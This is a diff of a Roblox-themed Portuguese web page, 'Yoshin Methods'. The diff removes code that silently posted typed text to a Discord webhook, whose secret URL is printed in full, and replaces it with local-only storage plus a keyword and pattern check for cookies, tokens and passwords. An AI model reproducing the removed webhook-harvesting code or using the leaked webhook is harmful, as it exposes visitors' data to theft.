@@ -1,209 +1,229 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="pt-br">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Yoshin Methods</title>
-
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>yoshin metods</title>
 <style>
-    body {
-        margin: 0;
-        padding: 0;
-        background: #000;
-        font-family: Arial, sans-serif;
-        overflow: hidden;
-        color: white;
-    }
+  :root{
+    --bg:#000;
+    --card:#0b0b0b;
+    --red:#c82020;
+    --muted:#e6e6e6;
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%;margin:0;background:var(--bg);color:var(--muted);font-family:Inter,Arial,Helvetica,sans-serif;overflow:hidden}
+  /* animated soft waves background */
+  .waves{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden;background:radial-gradient(circle at center,#070707 0%,#000 70%)}
+  .wave{position:absolute;width:220%;height:220%;top:-60%;left:-60%;border-radius:40%;background:rgba(200,0,0,0.04);animation:spin 12s linear infinite}
+  .wave:nth-child(2){animation-duration:18s;background:rgba(200,0,0,0.02)}
+  @keyframes spin{0%{transform:rotate(0) scale(1)}100%{transform:rotate(360deg) scale(1.25)}}
 
-    /* Fundo com ondas suaves */
-    .waves {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: radial-gradient(circle at center, #111 0%, #000 80%);
-        overflow: hidden;
-        z-index: -1;
-    }
+  /* big translucent roblox logo in background */
+  .logo-bg{position:fixed;inset:0;display:block;z-index:0;pointer-events:none}
+  .logo-bg::before{
+    content:"";position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);
+    width:640px;height:640px;background-image:url('https://upload.wikimedia.org/wikipedia/commons/1/1b/Roblox_Logo_Black.svg');
+    background-size:contain;background-repeat:no-repeat;opacity:0.055;filter:grayscale(100%);
+  }
 
-    .wave {
-        position: absolute;
-        width: 200%;
-        height: 200%;
-        top: -50%;
-        left: -50%;
-        background: rgba(255, 0, 0, 0.06);
-        border-radius: 45%;
-        animation: waveMove 9s infinite linear;
-    }
+  /* center card */
+  .wrap{position:relative;z-index:2;height:100%;display:flex;align-items:center;justify-content:center;padding:30px}
+  .card{width:520px;max-width:95%;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(0,0,0,0.45));border-radius:16px;padding:28px;border:1px solid rgba(255,255,255,0.03);backdrop-filter:blur(6px);box-shadow:0 18px 40px rgba(0,0,0,0.7)}
 
-    .wave:nth-child(2) {
-        animation-duration: 13s;
-        background: rgba(255, 0, 0, 0.03);
-    }
+  /* title 3D subtle + neon faint */
+  h1{margin:0 0 6px;font-family: 'Orbitron', sans-serif;font-size:34px;color:var(--red);letter-spacing:1px;
+      text-shadow: 0 0 4px rgba(80,0,0,0.5), 1px 1px 0 rgba(32,0,0,0.6)}
+  p.lead{margin:0 0 14px;color:rgba(230,230,230,0.9)}
 
-    @keyframes waveMove {
-        0% { transform: rotate(0deg) scale(1); }
-        100% { transform: rotate(360deg) scale(1.4); }
-    }
+  label{display:block;margin-bottom:8px;font-weight:600}
+  input[type="text"]{width:100%;padding:12px 14px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:#111;color:var(--muted);font-size:15px;outline:none}
+  input:focus{box-shadow:0 8px 20px rgba(200,0,0,0.06);border-color:rgba(200,0,0,0.25)}
 
-    /* LOGO ROBLOX */
-    .logo {
-        width: 160px;
-        opacity: 0.25;
-        position: absolute;
-        top: 40px;
-        left: 50%;
-        transform: translateX(-50%);
-    }
+  .row{display:flex;gap:10px;margin-top:14px}
+  .btn{flex:1;padding:12px 14px;border-radius:10px;border:0;background:linear-gradient(90deg,var(--red),#9b1515);color:#fff;font-weight:700;cursor:pointer;box-shadow:0 8px 22px rgba(200,0,0,0.12);transition:transform .12s}
+  .btn:active{transform:translateY(1px)}
+  .ghost{background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--muted);}
 
-    /* Caixa principal */
-    .box {
-        width: 450px;
-        margin: 180px auto 0 auto;
-        background: #0a0a0a;
-        padding: 30px;
-        border-radius: 20px;
-        text-align: center;
-        border: 2px solid #550000;
-        box-shadow: 0 0 20px #ff00001c;
-    }
+  .note{margin-top:12px;font-size:0.9rem;color:rgba(230,230,230,0.7)}
 
-    /* Título com neon suave */
-    h1 {
-        font-size: 34px;
-        font-weight: bold;
-        color: #c30000;
-        text-shadow:
-            0 0 4px #300000,
-            0 0 6px #200000,
-            1px 1px 0px #2a0000;
-    }
+  /* loading overlay */
+  #overlay{position:fixed;inset:0;display:none;z-index:40;align-items:center;justify-content:center;background:rgba(0,0,0,0.86);color:white}
+  .loader-box{width:92%;max-width:520px;background:rgba(11,11,11,0.95);padding:22px;border-radius:12px;border:1px solid rgba(255,255,255,0.03);text-align:center}
+  .loader-title{font-family:'Orbitron',sans-serif;color:var(--red);letter-spacing:1px;margin-bottom:8px}
+  .progress{height:14px;background:rgba(255,255,255,0.05);border-radius:999px;overflow:hidden}
+  .progress .ind{width:36%;height:100%;background:linear-gradient(90deg,rgba(255,80,80,0.18),rgba(255,0,0,0.9));position:relative;left:-40%;animation:slide 1.1s linear infinite}
+  @keyframes slide{0%{left:-40%}100%{left:140%}}
 
-    /* Input */
-    input {
-        width: 90%;
-        padding: 12px;
-        border-radius: 10px;
-        background: #1d1d1d;
-        border: 1px solid #550000;
-        color: white;
-        margin-top: 20px;
-        font-size: 16px;
-        outline: none;
-    }
+  /* small utilities */
+  .actions{display:flex;gap:10px;margin-top:12px}
+  .export-info{margin-top:10px;font-size:0.86rem;color:rgba(230,230,230,0.6)}
+  footer{margin-top:14px;font-size:0.82rem;color:rgba(230,230,230,0.55)}
 
-    /* Botão */
-    button {
-        margin-top: 20px;
-        padding: 12px 40px;
-        font-size: 18px;
-        background: #b30000;
-        border: none;
-        border-radius: 10px;
-        color: white;
-        cursor: pointer;
-        box-shadow: 0 0 10px #ff000055;
-        transition: .3s;
-    }
-
-    button:hover {
-        background: #8f0000;
-        transform: scale(1.05);
-    }
-
-    /* Tela de carregamento */
-    #loading {
-        display: none;
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: #000000e5;
-        backdrop-filter: blur(3px);
-        color: white;
-        font-size: 26px;
-        justify-content: center;
-        align-items: center;
-        flex-direction: column;
-    }
-
-    .loader {
-        width: 260px;
-        height: 18px;
-        background: #1a1a1a;
-        border-radius: 10px;
-        margin-top: 20px;
-        border: 2px solid red;
-        overflow: hidden;
-    }
-
-    .loader-bar {
-        height: 100%;
-        width: 40%;
-        background: red;
-        animation: load 1s infinite linear;
-    }
-
-    @keyframes load {
-        0% { margin-left: -40%; }
-        100% { margin-left: 100%; }
-    }
+  @media(max-width:560px){ .row{flex-direction:column} .wrap{padding:18px} }
 </style>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
 </head>
-
 <body>
 
-    <!-- Fundo -->
-    <div class="waves">
-        <div class="wave"></div>
-        <div class="wave"></div>
-    </div>
+  <div class="waves">
+    <div class="wave"></div>
+    <div class="wave"></div>
+  </div>
+  <div class="logo-bg" aria-hidden="true"></div>
 
-    <!-- Logo -->
-    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/1/1b/Roblox_Logo_Black.svg">
+  <div class="wrap">
+    <div class="card" role="main" aria-labelledby="siteTitle">
+      <div style="display:flex;align-items:center;gap:14px;margin-bottom:10px">
+        <div style="width:56px;height:56px;border-radius:10px;background:linear-gradient(135deg,#c82020,#9b1515);display:flex;align-items:center;justify-content:center;font-family:Orbitron;color:white;font-weight:700">Y</div>
+        <div>
+          <h1 id="siteTitle">Yoshin Metod</h1>
+          <p class="lead">Digite aqui</p>
+        </div>
+      </div>
 
-    <!-- Conteúdo -->
-    <div class="box">
-        <h1>Yoshin Methods</h1>
-        <p>Digite algo abaixo:</p>
-        <input id="texto" type="text" placeholder="Escreva qualquer coisa...">
-        <button onclick="enviar()">Enviar</button>
-    </div>
+      <label for="txt">Digite aqui:</label>
+      <input id="txt" type="text" placeholder="Digite aqui" autocomplete="off" />
 
-    <!-- Tela de carregamento -->
-    <div id="loading">
-        Enviando...
-        <div class="loader"><div class="loader-bar"></div></div>
+      <div class="row">
+        <button id="sendBtn" class="btn">Enviar</button>
+        <button id="saveBtn" class="btn ghost">Salvar local</button>
+      </div>
+
+      <div class="note">As mensagens ficam apenas no seu navegador por segurança. Você pode exportar ou simular envio.</div>
+
+      <div class="actions" style="margin-top:14px">
+        <button id="simulate" class="btn ghost" title="Simula envio (não envia nada)">Simular envio</button>
+        <button id="exportBtn" class="btn ghost" title="Exportar mensagens salvas">Exportar (.json)</button>
+        <button id="clearBtn" class="btn ghost" title="Limpar mensagens salvas">Limpar</button>
+      </div>
+
+      <div class="export-info" id="statusMsg" aria-live="polite"></div>
+
+      <footer>Versão segura — envio externo desativado.</footer>
     </div>
+  </div>
+
+  <!-- overlay carregamento -->
+  <div id="overlay" role="status" aria-hidden="true">
+    <div class="loader-box" role="dialog" aria-modal="true" aria-label="Carregando">
+      <div class="loader-title">PROCESSANDO...</div>
+      <div style="margin-bottom:10px">Aguarde um momento</div>
+      <div class="progress"><div class="ind"></div></div>
+    </div>
+  </div>
 
 <script>
-function enviar() {
-    let txt = document.getElementById("texto").value;
+  // ---------- armazenamento local (localStorage) ----------
+  const STORAGE_KEY = 'yoshin_messages_v1';
+  const txt = document.getElementById('txt');
+  const sendBtn = document.getElementById('sendBtn');
+  const saveBtn = document.getElementById('saveBtn');
+  const simulateBtn = document.getElementById('simulate');
+  const exportBtn = document.getElementById('exportBtn');
+  const clearBtn = document.getElementById('clearBtn');
+  const overlay = document.getElementById('overlay');
+  const statusMsg = document.getElementById('statusMsg');
 
-    if (txt.trim() === "") {
-        alert("Digite algo primeiro.");
-        return;
-    }
+  function loadMessages(){
+    try{
+      const raw = localStorage.getItem(STORAGE_KEY);
+      return raw ? JSON.parse(raw) : [];
+    }catch(e){ return []; }
+  }
+  function saveMessages(arr){
+    localStorage.setItem(STORAGE_KEY, JSON.stringify(arr));
+  }
+  function addMessage(text){
+    const list = loadMessages();
+    list.unshift({text, ts:new Date().toISOString()});
+    saveMessages(list);
+  }
 
-    document.getElementById("loading").style.display = "flex";
+  function showOverlay(){ overlay.style.display='flex'; overlay.setAttribute('aria-hidden','false'); }
+  function hideOverlay(){ overlay.style.display='none'; overlay.setAttribute('aria-hidden','true'); }
 
-    fetch("https://discord.com/api/webhooks/1440869478354124912/UeJLq2EsBNa7F7qmZlzeWASC9ePkHsRp6aq4Ca8UB0pevj60dfnW9ksXKoDa-RdQwgLw", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            content: "📩 **Novo texto enviado:**\n" + txt
-        })
-    });
+  function showStatus(msg, timeout=3000){
+    statusMsg.textContent = msg;
+    if(timeout>0) setTimeout(()=>{ if(statusMsg.textContent===msg) statusMsg.textContent=''; }, timeout);
+  }
 
-    setTimeout(() => {
-        document.getElementById("loading").style.display = "none";
-        document.getElementById("texto").value = "";
-    }, 2000);
-}
+  // simple sensitive-content heuristic to protect users
+  function pareceSensivel(t){
+    if(!t) return false;
+    if(/cookie|token|senha|password|auth|bearer/i.test(t)) return true;
+    if(t.length>200) return true; // too long
+    if(/[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{6,}\.[A-Za-z0-9_\-]{20,}/.test(t)) return true;
+    if(/^[A-Za-z0-9+/=]{60,}$/.test(t)) return true;
+    return false;
+  }
+
+  // Save locally
+  saveBtn.addEventListener('click', ()=>{
+    const v = (txt.value||'').trim();
+    if(!v){ showStatus('Digite algo antes.'); return; }
+    if(pareceSensivel(v)){ showStatus('Conteúdo parece sensível — não salvo.'); return; }
+    addMessage(v);
+    txt.value='';
+    showStatus('Mensagem salva localmente.');
+  });
+
+  // "Enviar" button — here we only save locally and show overlay to simulate process
+  sendBtn.addEventListener('click', async ()=>{
+    const v = (txt.value||'').trim();
+    if(!v){ showStatus('Digite algo antes.'); return; }
+    if(pareceSensivel(v)){ showStatus('Conteúdo parece sensível — ação bloqueada.'); return; }
+
+    // show overlay then save
+    showOverlay();
+    await new Promise(r=>setTimeout(r,700));
+    addMessage(v);
+    await new Promise(r=>setTimeout(r,500));
+    hideOverlay();
+    txt.value='';
+    showStatus('Mensagem processada localmente.');
+  });
+
+  // simulate — show overlay but do NOT send externally
+  simulateBtn.addEventListener('click', async ()=>{
+    const v = (txt.value||'').trim();
+    if(!v){ showStatus('Digite algo antes de simular.'); return; }
+    if(pareceSensivel(v)){ showStatus('Conteúdo parece sensível — simulação bloqueada.'); return; }
+    showOverlay();
+    await new Promise(r=>setTimeout(r,1200));
+    hideOverlay();
+    showStatus('Simulação concluída (nenhum dado enviado).');
+  });
+
+  // export saved messages as JSON file
+  exportBtn.addEventListener('click', ()=>{
+    const list = loadMessages();
+    if(!list.length){ showStatus('Nenhuma mensagem salva.'); return; }
+    const blob = new Blob([JSON.stringify(list, null, 2)], {type:'application/json'});
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'yoshin_messages.json';
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+    URL.revokeObjectURL(url);
+    showStatus('Arquivo exportado.');
+  });
+
+  // clear storage (confirm)
+  clearBtn.addEventListener('click', ()=>{
+    if(!confirm('Tem certeza que quer apagar todas as mensagens salvas localmente?')) return;
+    localStorage.removeItem(STORAGE_KEY);
+    showStatus('Mensagens apagadas.');
+  });
+
+  // accessibility: press enter to save
+  txt.addEventListener('keydown', (e)=>{ if(e.key==='Enter'){ e.preventDefault(); sendBtn.click(); } });
+
+  // focus on load
+  window.addEventListener('load', ()=>{ txt.focus(); });
+
 </script>
-
 </body>
 </html>
